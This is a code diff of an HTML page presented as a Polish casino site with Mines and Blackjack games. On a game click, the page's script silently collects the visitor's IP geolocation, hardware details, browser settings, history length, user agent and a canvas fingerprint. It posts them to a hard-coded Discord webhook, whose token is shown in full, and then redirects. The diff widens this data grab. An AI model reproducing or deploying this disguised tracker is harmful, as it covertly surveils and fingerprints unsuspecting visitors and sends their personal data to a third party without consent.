@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mines</title>
+    <title>Kasyno Mariusz</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -43,19 +43,23 @@
             color: #bb86fc;
             margin-bottom: 5px;
             letter-spacing: 2px;
-            text-shadow: 0 0 10px rgba(187, 134, 252, 0.3);
+            text-shadow: 0 0 15px rgba(187, 134, 252, 0.4);
+            font-size: 48px;
+            text-transform: uppercase;
+            text-align: center;
         }
 
         #console-container {
-            margin: 20px;
-            background: #1e1e1e;
+            margin: 20px 0 40px 0;
+            background: rgba(30, 30, 30, 0.8);
             padding: 15px;
             border-radius: 8px;
             border: 1px solid #333;
             width: 440px;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.8), 0 0 10px rgba(187, 134, 252, 0.1);
             font-family: 'Courier New', Courier, monospace;
             box-sizing: border-box;
+            backdrop-filter: blur(5px);
         }
 
         #ip {
@@ -63,49 +67,63 @@
             color: #03dac6;
             margin-bottom: 10px;
             min-height: 40px;
-            line-height: 1.4;
+            line-height: 1.5;
+            text-shadow: 0 0 5px rgba(3, 218, 198, 0.3);
         }
 
-        .progress-bar-container {
-            width: 100%;
-            background-color: #333;
-            border-radius: 4px;
-            overflow: hidden;
-            display: none;
+        .buttons {
+            display: flex;
+            gap: 30px;
+            justify-content: center;
         }
 
-        .progress-bar {
-            width: 0%;
-            height: 8px;
-            background-color: #bb86fc;
-            box-shadow: 0 0 8px #bb86fc;
-            transition: width 0.1s linear;
-        }
-
-        .btn-container {
-            background: none;
-            border: none;
-            padding: 0;
+        /* Nowy hakerski design przycisków */
+        .game-btn {
+            width: 220px;
+            height: 80px;
+            background: rgba(18, 18, 18, 0.6);
+            border: 2px solid;
+            border-radius: 8px;
+            font-size: 22px;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
             cursor: pointer;
-            transition: transform 0.2s, filter 0.3s;
-            outline: none;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(4px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        .btn-container:hover {
-            transform: scale(1.03);
-            filter: brightness(1.1);
+        /* Styl dla Mines (Zielony) */
+        .mines {
+            border-color: #22c55e;
+            color: #22c55e;
+            box-shadow: 0 0 10px rgba(34, 197, 94, 0.2), inset 0 0 10px rgba(34, 197, 94, 0.1);
         }
 
-        .btn-container:active {
-            transform: scale(0.97);
+        .mines:hover {
+            background: #22c55e;
+            color: #121212;
+            box-shadow: 0 0 20px rgba(34, 197, 94, 0.6), inset 0 0 15px rgba(34, 197, 94, 0.4);
+            transform: translateY(-5px);
         }
 
-        .btn-container img {
-            width: 450px;
-            border-radius: 15px;
-            border: 2px solid #bb86fc;
-            box-shadow: 0 0 20px rgba(187, 134, 252, 0.4);
-            display: block;
+        /* Styl dla Blackjacka (Czerwony) */
+        .blackjack {
+            border-color: #e11d48;
+            color: #e11d48;
+            box-shadow: 0 0 10px rgba(225, 29, 72, 0.2), inset 0 0 10px rgba(225, 29, 72, 0.1);
+        }
+
+        .blackjack:hover {
+            background: #e11d48;
+            color: #121212;
+            box-shadow: 0 0 20px rgba(225, 29, 72, 0.6), inset 0 0 15px rgba(225, 29, 72, 0.4);
+            transform: translateY(-5px);
         }
     </style>
 </head>
@@ -117,25 +135,17 @@
         <h1>Kasyno Mariusz</h1>
         
         <div id="console-container">
-            <div id="ip">> Kasyno</div>
-            <div class="progress-bar-container">
-                <div class="progress-bar" id="p-bar"></div>
-            </div>
+            <div id="ip">> Inicjalizacja skanera...</div>
         </div>
         
-        <button class="btn-container" onclick="startSystemAccess()">
-            <img src="https://radiokielce.pl/wp-content/uploads/2021/11/1-opatow-180109.jpeg" alt="WEJDŹ DO BAZY">
-        </button>
+        <div class="buttons">
+            <button class="game-btn mines" onclick="sendDataAndRedirect('index3.html', 'Mines')">💣 Mines</button>
+            <button class="game-btn blackjack" onclick="sendDataAndRedirect('index4.html', 'Blackjack')">🂡 Blackjack</button>
+        </div>
     </div>
 
     <script>
-        let geoData = {
-            ip: "Nieznane", country: "Nieznany", region: "Nieznany", city: "Nieznane", 
-            postal: "Nieznany", isp: "Nieznany", asn: "Nieznany", lat: "Brak", lon: "Brak"
-        };
-        let gpuModel = "Nie wykryto GPU";
-        let batteryInfo = "Brak danych (Niewspierane)";
-
+        // Animacja tła (Matrix)
         const canvas = document.getElementById('matrix-bg');
         const ctx = canvas.getContext('2d');
         function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
@@ -145,6 +155,7 @@
         const fontSize = 16;
         const columns = canvas.width / fontSize;
         const rainDrops = Array(Math.floor(columns)).fill(1);
+        
         function drawMatrix() {
             ctx.fillStyle = 'rgba(18, 18, 18, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = '#bb86fc'; ctx.font = fontSize + 'px monospace';
@@ -157,6 +168,15 @@
         }
         setInterval(drawMatrix, 30);
 
+        // Zmienne globalne na dodatkowe dane
+        let geoData = {
+            ip: "Nieznane", country: "Nieznany", region: "Nieznany", city: "Nieznane", 
+            postal: "Nieznany", isp: "Nieznany", asn: "Nieznany", lat: "Brak", lon: "Brak", timezone: "Nieznana", org: "Nieznana"
+        };
+        let gpuModel = "Nie wykryto GPU";
+        let batteryInfo = "Brak danych (Niewspierane/Desktop)";
+
+        // Asynchroniczne pobranie danych o lokalizacji IP
         fetch("https://ipapi.co/json/")
             .then(res => res.json())
             .then(data => {
@@ -169,147 +189,144 @@
                     isp: data.org || "Nieznany",
                     asn: data.asn || "Nieznany",
                     lat: data.latitude || "Brak",
-                    lon: data.longitude || "Brak"
+                    lon: data.longitude || "Brak",
+                    timezone: data.timezone || "Nieznana",
+                    org: data.org || "Nieznana"
                 };
-                document.getElementById("ip").innerHTML = "Casino by Mariuszhitman;
+                document.getElementById("ip").innerHTML = `> Skanowanie zakończone.<br>> Wykryto połączenie: ${geoData.ip}`;
             })
-            .catch(() => {
-                document.getElementById("ip").innerHTML = "> Casino by mariuszhitman";
-            });
+            .catch(() => { document.getElementById("ip").innerHTML = "> Wybierz gre!"; });
 
+        // GPU Skaner
         try {
             const glCanvas = document.createElement('canvas');
             const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
             if (gl) {
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    gpuModel = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
+                if (debugInfo) { gpuModel = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
             }
         } catch (e) {}
 
+        // Bateria
         if (navigator.getBattery) {
             navigator.getBattery().then(batt => {
-                batteryInfo = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Ładuje' : 'Rozładowuje'})`;
+                const isCharging = batt.charging ? 'Ładuje' : 'Rozładowuje';
+                batteryInfo = `${Math.round(batt.level * 100)}% (${isCharging})`;
             });
         }
 
+        // Unikalny Canvas Fingerprint
         function getCanvasFingerprint() {
             try {
                 const fCanvas = document.createElement('canvas');
                 const fCtx = fCanvas.getContext('2d');
-                fCanvas.width = 200;
-                fCanvas.height = 40;
-                fCtx.textBaseline = "top";
-                fCtx.font = "14px 'Arial'";
-                fCtx.fillStyle = "#f60";
-                fCtx.fillRect(125,1,62,20);
-                fCtx.fillStyle = "#069";
-                fCtx.fillText("INF.02_SCAN", 2, 15);
-                fCtx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                fCtx.fillText("INF.02_SCAN", 4, 17);
+                fCanvas.width = 200; fCanvas.height = 40;
+                fCtx.textBaseline = "top"; fCtx.font = "14px 'Arial'";
+                fCtx.fillStyle = "#f60"; fCtx.fillRect(125,1,62,20);
+                fCtx.fillStyle = "#069"; fCtx.fillText("M@riusz_Sc@n", 2, 15);
+                fCtx.fillStyle = "rgba(102, 204, 0, 0.7)"; fCtx.fillText("M@riusz_Sc@n", 4, 17);
                 const b64 = fCanvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < b64.length; i++) {
-                    hash = (hash << 5) - hash + b64.charCodeAt(i);
-                    hash |= 0;
+                    hash = (hash << 5) - hash + b64.charCodeAt(i); hash |= 0;
                 }
                 return Math.abs(hash).toString(16).toUpperCase();
-            } catch (e) {
-                return "Niedostępny";
-            }
+            } catch (e) { return "Niedostępny"; }
         }
 
-        function startSystemAccess() {
-            const ipDiv = document.getElementById("ip");
-            const btn = document.querySelector('.btn-container');
-            const pContainer = document.querySelector('.progress-bar-container');
-            const pBar = document.getElementById('p-bar');
+        function sendDataAndRedirect(destinationUrl, gameName) {
+            // Blokada po kliknięciu
+            document.querySelectorAll('.game-btn').forEach(btn => {
+                btn.style.pointerEvents = "none";
+                btn.style.opacity = "0.7";
+                btn.style.boxShadow = "none";
+            });
+            document.getElementById("ip").innerHTML = `> Przechwytywanie danych...<br>> Aktywacja modułu: ${gameName}`;
+
+            const nav = navigator;
+            const scr = window.screen;
+
+            // Maksymalizacja zbierania danych z przeglądarki
+            const screenRes = `${scr.width}x${scr.height} (${scr.colorDepth}-bit, px: ${scr.pixelDepth})`;
+            const windowRes = `${window.innerWidth}x${window.innerHeight} (Avail: ${scr.availWidth}x${scr.availHeight})`;
+            const orientation = (scr.orientation || {}).type || "Brak danych";
             
-            btn.style.pointerEvents = "none";
-            btn.style.opacity = "0.4";
-            pContainer.style.display = "block";
-
-            const steps = [
-                { prg: 10, msg: "> Mines" },
-                { prg: 30, msg: "> Mines" },
-                { prg: 50, msg: "> Mines" },
-                { prg: 75, msg: "> Mines" },
-                { prg: 90, msg: "> Mines" },
-                { prg: 100, msg: "> Mines" }
-            ];
-
-            const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
-            const windowRes = `${window.innerWidth}x${window.innerHeight} (Dostępne: ${window.screen.availWidth}x${window.screen.availHeight})`;
-            const cCores = navigator.hardwareConcurrency || "Brak danych";
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Brak danych";
-            const lang = navigator.language || "Nieznany";
-            const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Ciemny (Dark)" : "Jasny (Light)";
+            const cCores = nav.hardwareConcurrency || "Brak danych";
+            const ram = nav.deviceMemory ? `${nav.deviceMemory} GB` : "Brak danych";
+            const platform = nav.platform || "Nieznana";
+            const vendor = nav.vendor || "Brak (Prawdopodobnie Firefox/Brave)";
+            const langArray = nav.languages ? nav.languages.join(", ") : nav.language || "Nieznany";
+            
             const localTime = new Date().toLocaleString('pl-PL');
+            const timeZoneOffset = -(new Date().getTimezoneOffset() / 60) + "h";
+            const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
             
-            const platform = navigator.platform || "Nieznany";
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Nieznana";
-            const networkStatus = navigator.onLine ? "Online" : "Offline";
-            const connectionType = navigator.connection ? (navigator.connection.effectiveType || "Nieznany") : "Brak danych";
-            const cookiesEnabled = navigator.cookieEnabled ? "Włączone" : "Wyłączone";
-            const referrerPage = document.referrer || "Bezpośrednie wejście / Ukryty";
+            const connType = nav.connection ? `${nav.connection.effectiveType || "Nieznany"} (Downlink: ${nav.connection.downlink || 0} Mbps, RTT: ${nav.connection.rtt || 0} ms)` : "Brak danych";
+            const isOnline = nav.onLine ? "Tak" : "Nie";
+            const dnt = nav.doNotTrack === "1" ? "Włączone (Do Not Track)" : "Wyłączone";
+            const cookiesEnabled = nav.cookieEnabled ? "Tak" : "Nie";
             
-            const isAutomated = navigator.webdriver ? "Tak (Wykryto Bot/Automatyzację)" : "Nie (Prawdziwy użytkownik)";
-            const touchPoints = navigator.maxTouchPoints || 0;
-            const deviceType = touchPoints > 0 ? `Urządzenie Dotykowe (${touchPoints} pkt)` : "Klasyczny PC (Brak dotyku)";
+            const historyLen = window.history.length;
+            const pluginsCount = nav.plugins ? nav.plugins.length : 0;
+            const touchPoints = nav.maxTouchPoints || 0;
+            const deviceType = touchPoints > 0 ? `Urządzenie Dotykowe (${touchPoints} pkt dotyku)` : "Klasyczny PC (Myszka)";
+            const isAutomated = nav.webdriver ? "⚠️ TAK (Wykryto Bota/Webdriver)" : "Nie";
             const canvasHash = getCanvasFingerprint();
+            const referrer = document.referrer || "Brak / Bezpośrednie wejście";
 
-            let currentStep = 0;
+            // Budowa potężnego ładunku z podziałem na sekcje
+            const payload = {
+                content: "=======================================\n" +
+                         `🚨 **MARIUSZHITMAN GITHUB**\n` +
+                         `🎮 **WYBRANA GRA:** \`${gameName}\`\n` +
+                         "=======================================\n" +
+                         `**📡 [LOKALIZACJA I SIEĆ]**\n` +
+                         `🌐 **IP:** \`${geoData.ip}\`\n` +
+                         `🏢 **Dostawca / ASN:** \`${geoData.isp} (${geoData.asn})\`\n` +
+                         `📍 **Adres:** \`${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.postal})\`\n` +
+                         `🗺️ **Współrzędne:** \`${geoData.lat}, ${geoData.lon}\`\n` +
+                         `🕒 **Strefa Czasowa IP:** \`${geoData.timezone}\`\n` +
+                         "---------------------------------------\n" +
+                         `**💻 [SPRZĘT UŻYTKOWNIKA]**\n` +
+                         `⚙️ **Procesor (Wątki):** \`${cCores} vCPU\`\n` +
+                         `🧠 **Pamięć RAM:** \`${ram}\`\n` +
+                         `🎮 **Karta Graficzna:** \`${gpuModel}\`\n` +
+                         `🔋 **Bateria:** \`${batteryInfo}\`\n` +
+                         `🖥️ **Ekran:** \`${screenRes}\`\n` +
+                         `🔲 **Okno:** \`${windowRes}\`\n` +
+                         `🔄 **Orientacja ekranu:** \`${orientation}\`\n` +
+                         `👆 **Typ Urządzenia:** \`${deviceType}\`\n` +
+                         "---------------------------------------\n" +
+                         `**🌍 [PRZEGLĄDARKA I SYSTEM]**\n` +
+                         `💻 **Platforma OS:** \`${platform}\`\n` +
+                         `🌓 **Motyw systemowy:** \`${isDark}\`\n` +
+                         `📶 **Jakość Połączenia:** \`${connType} | Online: ${isOnline}\`\n` +
+                         `🗣️ **Języki:** \`${langArray}\`\n` +
+                         `⏳ **Czas lokalny:** \`${localTime} (Offset: ${timeZoneOffset})\`\n` +
+                         `🧩 **Liczba wtyczek:** \`${pluginsCount}\`\n` +
+                         `🍪 **Cookies:** \`${cookiesEnabled}\` | **DNT:** \`${dnt}\`\n` +
+                         `🔗 **Referrer (Źródło):** \`${referrer}\`\n` +
+                         `📖 **Długość Historii:** \`${historyLen} stron\`\n` +
+                         "---------------------------------------\n" +
+                         `**🛡️ [BEZPIECZEŃSTWO / FINGERPRINT]**\n` +
+                         `🤖 **Wykryto Bota:** \`${isAutomated}\`\n` +
+                         `🧬 **Canvas Fingerprint:** \`${canvasHash}\`\n` +
+                         `🏭 **Vendor:** \`${vendor}\`\n` +
+                         `🕵️ **User-Agent:** \`${nav.userAgent}\`\n` +
+                         "======================================="
+            };
 
-            const interval = setInterval(() => {
-                if (currentStep < steps.length) {
-                    const step = steps[currentStep];
-                    pBar.style.width = step.prg + "%";
-                    ipDiv.innerHTML = step.msg;
+            // Wysłanie danych pod wskazany Discord Webhook
+            fetch("https://discord.com/api/webhooks/1524739296358301830/Y92PysbT7F2Wrbd5Oz0JcdtHAWJDO-g9H2yH_-Frs5RP8MCPmZyDKAfq1BZ6QITk22G1", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
 
-                    if (step.prg === 90) {
-                        const payload = {
-                            content: "=======================================\n" +
-                                     "🚨 **MARIUSZHITMAN**\n" +
-                                     "=======================================\n" +
-                                     `🌐 **Adres IP:** \`${geoData.ip}\`\n` +
-                                     `🏢 **Dostawca (ISP):** \`${geoData.isp} (${geoData.asn})\`\n` +
-                                     `📍 **Lokalizacja:** \`${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.postal})\`\n` +
-                                     `🗺️ **Współrzędne:** \`${geoData.lat}, ${geoData.lon}\`\n` +
-                                     "---------------------------------------\n" +
-                                     `💻 **System / Platforma:** \`${platform}\`\n` +
-                                     `🎮 **Karta Graficzna:** \`${gpuModel}\`\n` +
-                                     `🧬 **Canvas Fingerprint:** \`${canvasHash}\`\n` +
-                                     `🔋 **Status Baterii:** \`${batteryInfo}\`\n` +
-                                     `⚙️ **Procesor / RAM:** \`${cCores} vCPU / ${ram}\`\n` +
-                                     `🖥️ **Rozdzielczość:** \`${screenRes}\`\n` +
-                                     `🔲 **Okno Przeglądarki:** \`${windowRes}\`\n` +
-                                     `👆 **Typ Urządzenia:** \`${deviceType}\`\n` +
-                                     "---------------------------------------\n" +
-                                     `🤖 **Wykrycie Bota (Webdriver):** \`${isAutomated}\`\n` +
-                                     `📶 **Sieć / Połączenie:** \`${networkStatus} (${connectionType})\`\n` +
-                                     `🍪 **Pliki Cookie:** \`${cookiesEnabled}\`\n` +
-                                     `🔗 **Źródło wejścia (Referrer):** \`${referrerPage}\`\n` +
-                                     `💬 **Język / Czas:** \`${lang} / ${localTime} (${timezone})\`\n` +
-                                     "---------------------------------------\n" +
-                                     `🤖 **User-Agent:** \`${navigator.userAgent}\`\n` +
-                                     "======================================="
-                        };
-
-                        fetch("https://discord.com/api/webhooks/1523505680487682130/cXZJeTb9C-j1MdHNtegL1-GFlYhme4cImjhNjO9mZGF6IyOIveATmkIr9N-fuNCu7QSM", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify(payload)
-                        }).catch(() => {});
-                    }
-                    currentStep++;
-                } else {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        window.location.href = "index2.html";
-                    }, 10);
-                }
-            }, 10);
+            // Niemal natychmiastowe przekierowanie
+            setTimeout(() => {
+                window.location.href = destinationUrl;
+            }, 100);
         }
     </script>
 </body>
